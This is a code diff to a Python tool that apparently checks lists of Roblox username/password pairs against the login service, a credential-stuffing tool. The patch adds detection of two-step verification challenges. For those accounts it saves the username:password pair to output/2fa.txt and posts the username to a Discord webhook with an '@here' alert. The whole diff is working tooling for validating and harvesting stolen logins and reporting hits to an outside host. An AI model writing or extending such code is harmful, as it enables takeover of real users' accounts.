@@ -19,8 +19,10 @@ config = Util.get_config()
 WEBHOOK_ENABLED = config["logWebhook"]
 LOCKED_WEBHOOK = config.get("lockedWebhook")
 LOCKED_WEBHOOK_ENABLED = bool(LOCKED_WEBHOOK)
+TWOFA_WEBHOOK = config.get("twofaWebhook")
+TWOFA_WEBHOOK_ENABLED = bool(TWOFA_WEBHOOK)
 
-if WEBHOOK_ENABLED == True or LOCKED_WEBHOOK_ENABLED == True:
+if WEBHOOK_ENABLED == True or LOCKED_WEBHOOK_ENABLED == True or TWOFA_WEBHOOK_ENABLED == True:
     from discord_webhook import DiscordWebhook, DiscordEmbed
 
 if type(WEBHOOK_ENABLED) != bool:
@@ -89,9 +91,19 @@ class Roblox:
         
         if self.ctype == "Email" and "Received credentials belong to multiple accounts" in response.text:
             return response.json()
+
+        if "Verification" in response.text:
+            raise ValueError("2fa")
         
         if "Account has been locked" in response.text:
             raise ValueError("locked")
+        challenge_type = response.headers.get("rblx-challenge-type")
+
+        if challenge_type == "denied":
+            raise ValueError("Challenge type denied")
+
+        if challenge_type == "twostepverification":
+            raise ValueError("2fa")
         
         if response.status_code == 200 and ".ROBLOSECURITY" in response.cookies:
             self.account[0] = response.json()["user"]["name"]
@@ -217,6 +229,9 @@ class Roblox:
                     self.checked = True
                     continue
 
+                if "Verification" in response.text:
+                    raise ValueError("2fa")
+
                 if "Account has been locked" in response.text:
                     raise ValueError("locked")
 
@@ -244,6 +259,9 @@ class Roblox:
 
                 if challenge_type == "denied":
                     raise ValueError("Challenge type denied")
+
+                if challenge_type == "twostepverification":
+                    raise ValueError("2fa")
 
                 challenge_id = response.headers.get("rblx-challenge-id")
                 metadata = loads(b64decode(response.headers.get("rblx-challenge-metadata").encode("utf-8")).decode("utf-8"))
@@ -469,6 +487,27 @@ class Roblox:
                     if LOCKED_WEBHOOK_ENABLED:
                         try:
                             webhook = DiscordWebhook(url=LOCKED_WEBHOOK, content="@here")
+
+                            embed = DiscordEmbed(title=f'**Username: {self.account[0]}**', color='FFFF00')
+
+                            embed.set_timestamp()
+                            
+                            webhook.add_embed(embed)
+                            webhook.execute()
+                        except:
+                            pass
+                elif str(e) == "2fa":
+                    self.checked = True
+
+                    Output("2FA").log(f"Valid account [2fa] | {self.account[0]}")
+
+                    with self.lock.get_lock():
+                        with open("output/2fa.txt", "a", encoding="utf-8") as file:
+                            file.write(f'{self.account[0]}:{self.account[1]}\n')
+
+                    if TWOFA_WEBHOOK_ENABLED:
+                        try:
+                            webhook = DiscordWebhook(url=TWOFA_WEBHOOK, content="@here")
 
                             embed = DiscordEmbed(title=f'**Username: {self.account[0]}**', color='FFFF00')
 
